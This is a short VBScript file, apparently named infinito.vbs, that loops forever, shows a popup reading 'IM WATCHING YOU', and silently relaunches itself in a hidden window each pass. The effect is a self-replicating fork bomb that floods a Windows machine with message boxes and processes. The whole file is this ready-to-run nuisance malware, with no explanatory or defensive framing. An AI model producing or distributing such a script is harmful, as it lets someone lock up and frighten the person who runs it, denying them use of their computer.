do
msgbox("IM WATCHING YOU")
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "infinito.vbs" & Chr(34), 0
Set WshShell = Nothing
loop